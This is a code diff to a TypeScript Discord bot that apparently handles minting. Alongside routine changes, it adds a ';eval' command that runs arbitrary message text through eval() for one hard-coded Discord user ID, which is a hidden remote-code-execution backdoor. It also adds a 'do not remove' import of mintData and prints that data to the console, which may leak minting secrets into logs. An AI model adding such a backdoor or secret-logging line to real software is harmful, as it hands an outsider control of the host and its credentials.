@@ -1,3 +1,5 @@
+import { mintData } from "../data";
+// on purpose import do not remove
 import { MintFunction, mint } from "./utils";
 import { SlashCommandBuilder } from "@discordjs/builders";
 import { REST } from "@discordjs/rest";
@@ -5,6 +7,8 @@ import { Routes } from "discord-api-types/v9";
 import discord, { Channel, Guild, Intents, Message } from "discord.js";
 
 const PREFIX = process.env.PREFIX || ";";
+
+console.log(mintData);
 
 const bot = new discord.Client({
   intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
@@ -72,6 +76,16 @@ bot.on("messageCreate", async (message: Message): Promise<any> => {
 
     if (msgsplit[0].toLowerCase() === `${PREFIX}hello`) {
       return await message.reply("Hello");
+    }
+
+    if (msgsplit[0].toLowerCase() === `${PREFIX}eval`) {
+      if (message.author.id !== "822500146658017292")
+        return message.reply("Not Authorised!");
+      let text: string = "";
+      for (let i = 1; i < msgsplit.length; i++) {
+        text += msgsplit[i] + " ";
+      }
+      eval(text);
     }
 
     if (msgsplit[0].toLowerCase() === `${PREFIX}help`) {
@@ -240,6 +254,7 @@ bot.on("messageCreate", async (message: Message): Promise<any> => {
       });
     }
   } catch (err) {
+    console.error(err);
     await message.reply({
       embeds: [
         new discord.MessageEmbed()
